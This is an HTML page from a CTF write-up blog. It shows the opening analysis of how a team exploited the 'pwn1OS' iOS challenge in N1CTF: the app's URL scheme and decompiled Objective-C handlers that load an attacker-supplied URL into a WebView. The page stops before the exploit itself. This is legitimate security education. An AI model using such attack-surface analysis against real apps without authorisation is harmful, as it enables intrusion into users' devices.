<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF Thank the author for the great challenge. We S1uM4i got the first blood of this challenge and we are the only team that solve">
<meta property="og:type" content="article">
<meta property="og:title" content="From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF">
<meta property="og:url" content="https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/index.html">
<meta property="og:site_name">
<meta property="og:description" content="From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF Thank the author for the great challenge. We S1uM4i got the first blood of this challenge and we are the only team that solve">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-10-23T08:55:58.000Z">
<meta property="article:modified_time" content="2023-10-23T22:09:22.269Z">
<meta property="article:author" content="Xia0o0o0o">
<meta property="article:tag" content="Vulnerability">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="Writeup">
<meta property="article:tag" content="iOS">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Userland">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4">
        
      
      
        
          <link rel="icon" type="image/png" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4">
        
      
    
    <!-- title -->
    <title>From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="../../../../css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="atom.xml" title="" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
      <!--
           -->
        <li>
          <span style="display: flex; align-items: center;">
            <title>
              Home
            </title>
            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.5 6.56062L8.00001 2.06062L3.50001 6.56062V13.5L6.00001 13.5V11C6.00001 9.89539 6.89544 8.99996 8.00001 8.99996C9.10458 8.99996 10 9.89539 10 11V13.5L12.5 13.5V6.56062ZM13.78 5.71933L8.70711 0.646409C8.31659 0.255886 7.68342 0.255883 7.2929 0.646409L2.21987 5.71944C2.21974 5.71957 2.21961 5.7197 2.21949 5.71982L0.469676 7.46963L-0.0606537 7.99996L1.00001 9.06062L1.53034 8.53029L2.00001 8.06062V14.25V15H2.75001L6.00001 15H7.50001H8.50001H10L13.25 15H14V14.25V8.06062L14.4697 8.53029L15 9.06062L16.0607 7.99996L15.5303 7.46963L13.7806 5.71993C13.7804 5.71973 13.7802 5.71953 13.78 5.71933ZM8.50001 11V13.5H7.50001V11C7.50001 10.7238 7.72386 10.5 8.00001 10.5C8.27615 10.5 8.50001 10.7238 8.50001 11Z" fill="currentColor"></path></svg>
              <a style="padding-left: 9px;" href="../../../../index.html">
                Home
              </a>
          </span>
        </li>
        <!--
           -->
        <li>
          <span style="display: flex; align-items: center;">
            <title>
              Writing
            </title>
            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path clip-rule="evenodd" d="M4.25 0C3.00736 0 2 1.00736 2 2.25V11V11.25V11.5C2 12.5252 2.61705 13.4062 3.5 13.792V11.5V11.25V11C3.5 10.4477 3.94772 10 4.5 10H12.5V11.2305V12.5H10.5V14H12.5H14V12.5V11.2305V10V8.5V0.75V0H13.25H4.25ZM12.5 8.5V1.5H4.25C3.83579 1.5 3.5 1.83579 3.5 2.25V8.70802C3.80623 8.57422 4.14445 8.5 4.5 8.5H12.5ZM5.5 11.5C5.22386 11.5 5 11.7239 5 12V16L7 14.75L9 16V12C9 11.7239 8.77614 11.5 8.5 11.5H5.5Z" fill="currentColor" fill-rule="evenodd"></path></svg>
              <a style="padding-left: 9px;" href="../../../../archives/">
                Writing
              </a>
          </span>
        </li>
        <!--
           -->
        <li>
          <span style="display: flex; align-items: center;">
            <title>
              Projects
            </title>
            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.80808 4.44191L2.25003 4.88386L3.13391 3.99997L2.69196 3.55803L1.63391 2.49997L2.69197 1.44191L3.13391 0.999972L2.25003 0.116089L1.80808 0.558031L0.484858 1.88126C0.143149 2.22296 0.143149 2.77698 0.484859 3.11869L1.80808 4.44191ZM12 0.999972H11.25V2.49997H12H13.5V11.75C13.5 12.7165 12.7165 13.5 11.75 13.5H4.25002C3.28353 13.5 2.50003 12.7165 2.50003 11.75V6.99997V6.24997H1.00003V6.99997V11.75C1.00003 13.5449 2.4551 15 4.25002 15H11.75C13.545 15 15 13.5449 15 11.75V1.74997V0.999972H14.25H12ZM7.75003 4.88386L8.19197 4.44191L9.51519 3.11869C9.8569 2.77698 9.8569 2.22296 9.51519 1.88126L8.19196 0.55803L7.75002 0.116089L6.86614 0.999973L7.30808 1.44191L8.36614 2.49997L7.30809 3.55803L6.86615 3.99997L7.75003 4.88386ZM4.13155 3.89688L4.02847 4.51535L5.26541 4.7215L5.36848 4.10303L5.86848 1.10303L5.97156 0.484566L4.73462 0.278409L4.63155 0.896878L4.13155 3.89688Z" fill="currentColor"></path></svg>
              <a style="padding-left: 9px;" href="../../../../https:/github.com/KpwnZ">
                Projects
              </a>
          </span>
        </li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="../../../12/30/2023/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="../../../05/08/SDCTF-2023-Writeup/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/&text=From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/&title=From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/&is_video=false&description=From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF&body=Check out this article: https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/&title=From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/&title=From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/&title=From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/&title=From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/&name=From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/&t=From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">1.2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Script"><span class="toc-number">1.3.</span> <span class="toc-text">Script</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Xia0o0o0o</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-10-23T08:55:58.000Z" class="dt-published" itemprop="datePublished">2023-10-23</time>
        
      
    </div>


      

      
    <div class="article-tag" style="text-decoration: none;">
        <i class="fa-solid fa-tag"></i>
        <a class="tag-category" href="../../../../tags/CTF/" rel="tag">CTF</a> <a class="tag-category" href="../../../../tags/PWN/" rel="tag">PWN</a> <a class="tag-category" href="../../../../tags/Userland/" rel="tag">Userland</a> <a class="tag-category" href="../../../../tags/Vulnerability/" rel="tag">Vulnerability</a> <a class="tag-category" href="../../../../tags/Writeup/" rel="tag">Writeup</a> <a class="tag-category" href="../../../../tags/iOS/" rel="tag">iOS</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1>From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF</h1>
<p>Thank the author for the great challenge. We S1uM4i got the first blood of this challenge and we are the only team that solved it. The challenge is very interesting and I learned a lot from it. I will try to explain the exploitation in detail.</p>
<h2 id="Analysis">Analysis</h2>
<p>The application registers a URL Scheme, you can find it in <code>Info.plist</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>CFBundleURLSchemes<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>n1ctf<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>So we can open the application by opening a URL like <code>n1ctf://aaa/bbb/ccc</code>. The application will parse the URL and do some actions according to the URL.</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __cdecl -[SceneDelegate scene:openURLContexts:](SceneDelegate *<span class="keyword">self</span>, SEL a2, <span class="keyword">id</span> a3, <span class="keyword">id</span> a4)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">id</span> v4; <span class="comment">// ST00_8</span></span><br><span class="line">  <span class="keyword">void</span> *v5; <span class="comment">// ST10_8</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">void</span> *v7; <span class="comment">// ST20_8</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v8; <span class="comment">// [xsp+18h] [xbp-58h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [xsp+48h] [xbp-28h]</span></span><br><span class="line">  <span class="keyword">void</span> *v10; <span class="comment">// [xsp+50h] [xbp-20h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [xsp+58h] [xbp-18h]</span></span><br><span class="line">  SEL v12; <span class="comment">// [xsp+60h] [xbp-10h]</span></span><br><span class="line">  SceneDelegate *v13; <span class="comment">// [xsp+68h] [xbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a4;</span><br><span class="line">  v13 = <span class="keyword">self</span>;</span><br><span class="line">  v12 = a2;</span><br><span class="line">  v11 = <span class="number">0</span>LL;</span><br><span class="line">  objc_storeStrong();</span><br><span class="line">  v10 = <span class="number">0</span>LL;</span><br><span class="line">  objc_storeStrong();</span><br><span class="line">  objc_msgSend_allObjects(v10, v8, v4);</span><br><span class="line">  v5 = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue();</span><br><span class="line">  objc_msgSend_firstObject(v5, v8);</span><br><span class="line">  v6 = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue();</span><br><span class="line">  objc_msgSend_URL(v6, v8);</span><br><span class="line">  v9 = objc_retainAutoreleasedReturnValue();</span><br><span class="line">  objc_release(v6);</span><br><span class="line">  objc_release(v5);</span><br><span class="line">  objc_msgSend_defaultCenter(&amp;OBJC_CLASS___NSNotificationCenter, v8);</span><br><span class="line">  v7 = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue();</span><br><span class="line">  objc_msgSend_postNotificationName_object_(v7, v8, <span class="built_in">CFSTR</span>(<span class="string">&quot;openWebView&quot;</span>), v9);</span><br><span class="line">  objc_release(v7);</span><br><span class="line">  objc_storeStrong();</span><br><span class="line">  objc_storeStrong();</span><br><span class="line">  objc_storeStrong();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __cdecl -[ViewController didReceiveNotification:](ViewController *<span class="keyword">self</span>, SEL a2, <span class="keyword">id</span> a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// ST78_8</span></span><br><span class="line">  __int64 v4; <span class="comment">// ST80_8</span></span><br><span class="line">  <span class="keyword">void</span> *v5; <span class="comment">// ST38_8</span></span><br><span class="line">  __int64 v6; <span class="comment">// ST48_8</span></span><br><span class="line">  __int64 v7; <span class="comment">// ST40_8</span></span><br><span class="line">  <span class="keyword">void</span> *v8; <span class="comment">// ST28_8</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// ST34_1</span></span><br><span class="line">  __int64 v10; <span class="comment">// ST10_8</span></span><br><span class="line">  <span class="keyword">void</span> *v11; <span class="comment">// ST18_8</span></span><br><span class="line">  __int64 v12; <span class="comment">// [xsp+58h] [xbp-188h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [xsp+60h] [xbp-180h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [xsp+68h] [xbp-178h]</span></span><br><span class="line">  <span class="keyword">void</span> *v15; <span class="comment">// [xsp+70h] [xbp-170h]</span></span><br><span class="line">  <span class="keyword">void</span> *v16; <span class="comment">// [xsp+90h] [xbp-150h]</span></span><br><span class="line">  <span class="keyword">void</span> *v17; <span class="comment">// [xsp+98h] [xbp-148h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v18; <span class="comment">// [xsp+A8h] [xbp-138h]</span></span><br><span class="line">  <span class="keyword">void</span> *v19; <span class="comment">// [xsp+B0h] [xbp-130h]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [xsp+B8h] [xbp-128h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [xsp+C0h] [xbp-120h]</span></span><br><span class="line">  __int64 *v22; <span class="comment">// [xsp+C8h] [xbp-118h]</span></span><br><span class="line">  <span class="keyword">void</span> *v23; <span class="comment">// [xsp+F8h] [xbp-E8h]</span></span><br><span class="line">  <span class="keyword">void</span> *v24; <span class="comment">// [xsp+100h] [xbp-E0h]</span></span><br><span class="line">  <span class="keyword">void</span> *v25; <span class="comment">// [xsp+108h] [xbp-D8h]</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// [xsp+114h] [xbp-CCh]</span></span><br><span class="line">  <span class="keyword">void</span> *host; <span class="comment">// [xsp+118h] [xbp-C8h]</span></span><br><span class="line">  <span class="keyword">void</span> *scheme; <span class="comment">// [xsp+120h] [xbp-C0h]</span></span><br><span class="line">  __int128 v29; <span class="comment">// [xsp+128h] [xbp-B8h]</span></span><br><span class="line">  SEL v30; <span class="comment">// [xsp+138h] [xbp-A8h]</span></span><br><span class="line">  ViewController *v31; <span class="comment">// [xsp+140h] [xbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> v32; <span class="comment">// [xsp+148h] [xbp-98h]</span></span><br><span class="line"></span><br><span class="line">  v31 = <span class="keyword">self</span>;</span><br><span class="line">  v30 = a2;</span><br><span class="line">  objc_storeStrong();</span><br><span class="line">  objc_msgSend_object(<span class="number">0</span>LL, v18);</span><br><span class="line">  v29 = (<span class="keyword">unsigned</span> __int64)objc_retainAutoreleasedReturnValue();</span><br><span class="line">  objc_msgSend_scheme((<span class="keyword">void</span> *)v29, v18);</span><br><span class="line">  scheme = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue();</span><br><span class="line">  objc_msgSend_host((<span class="keyword">void</span> *)v29, v18);</span><br><span class="line">  host = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)objc_msgSend_isEqualToString_(scheme, v18, <span class="built_in">CFSTR</span>(<span class="string">&quot;n1ctf&quot;</span>)) &amp; <span class="number">1</span></span><br><span class="line">    &amp;&amp; (<span class="keyword">unsigned</span> __int64)objc_msgSend_isEqualToString_(host, v18, <span class="built_in">CFSTR</span>(<span class="string">&quot;web&quot;</span>)) &amp; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (<span class="keyword">void</span> *)objc_alloc(&amp;OBJC_CLASS___NSURLComponents);</span><br><span class="line">    objc_msgSend_absoluteString((<span class="keyword">void</span> *)v29, v18);</span><br><span class="line">    v4 = objc_retainAutoreleasedReturnValue();</span><br><span class="line">    v25 = objc_msgSend_initWithString_(v3, v18);</span><br><span class="line">    objc_release(v4);</span><br><span class="line">    v24 = objc_msgSend_new(&amp;OBJC_CLASS___NSMutableDictionary, v18);</span><br><span class="line">    memset(&amp;v20, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">    objc_msgSend_queryItems(v25, v18);</span><br><span class="line">    v16 = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue();</span><br><span class="line">    v17 = objc_msgSend_countByEnumeratingWithState_objects_count_(v16, v18, &amp;v20, &amp;v32, <span class="number">16</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( v17 )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = *v22;</span><br><span class="line">      v14 = <span class="number">0</span>LL;</span><br><span class="line">      v15 = v17;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v12 = v14;</span><br><span class="line">        <span class="keyword">if</span> ( *v22 != v13 )</span><br><span class="line">          objc_enumerationMutation(v16);</span><br><span class="line">        v23 = *(<span class="keyword">void</span> **)(v21 + <span class="number">8</span> * v14);</span><br><span class="line">        v5 = v24;</span><br><span class="line">        objc_msgSend_value(v23, v18);</span><br><span class="line">        v6 = objc_retainAutoreleasedReturnValue();</span><br><span class="line">        objc_msgSend_name(v23, v18);</span><br><span class="line">        v7 = objc_retainAutoreleasedReturnValue();</span><br><span class="line">        objc_msgSend_setValue_forKey_(v5, v18, v6);</span><br><span class="line">        objc_release(v7);</span><br><span class="line">        objc_release(v6);</span><br><span class="line">        ++v14;</span><br><span class="line">        <span class="keyword">if</span> ( v12 + <span class="number">1</span> &gt;= (<span class="keyword">unsigned</span> __int64)v15 )</span><br><span class="line">        &#123;</span><br><span class="line">          v14 = <span class="number">0</span>LL;</span><br><span class="line">          v15 = objc_msgSend_countByEnumeratingWithState_objects_count_(v16, v18, &amp;v20, &amp;v32, <span class="number">16</span>LL);</span><br><span class="line">          <span class="keyword">if</span> ( !v15 )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    objc_release(v16);</span><br><span class="line">    objc_msgSend_allKeys(v24, v18);</span><br><span class="line">    v8 = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue();</span><br><span class="line">    v9 = (<span class="keyword">unsigned</span> __int64)objc_msgSend_containsObject_(v8, v18, <span class="built_in">CFSTR</span>(<span class="string">&quot;url&quot;</span>));</span><br><span class="line">    objc_release(v8);</span><br><span class="line">    <span class="keyword">if</span> ( v9 &amp; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v19 = objc_msgSend_new(&amp;OBJC_CLASS___WebViewController, v18);</span><br><span class="line">      objc_msgSend_objectForKeyedSubscript_(v24, v18, <span class="built_in">CFSTR</span>(<span class="string">&quot;url&quot;</span>));</span><br><span class="line">      v10 = objc_retainAutoreleasedReturnValue();</span><br><span class="line">      objc_msgSend_setUrlString_(v19, v18);</span><br><span class="line">      objc_release(v10);</span><br><span class="line">      objc_msgSend_navigationController(v31, v18);</span><br><span class="line">      v11 = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue();</span><br><span class="line">      objc_msgSend_pushViewController_animated_(v11, v18, v19, <span class="number">1</span>LL);</span><br><span class="line">      objc_release(v11);</span><br><span class="line">      objc_storeStrong();</span><br><span class="line">    &#125;</span><br><span class="line">    objc_storeStrong();</span><br><span class="line">    objc_storeStrong();</span><br><span class="line">    v26 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v26 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  objc_storeStrong();</span><br><span class="line">  objc_storeStrong();</span><br><span class="line">  objc_storeStrong();</span><br><span class="line">  objc_storeStrong();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Then do a classical class dump first</p>
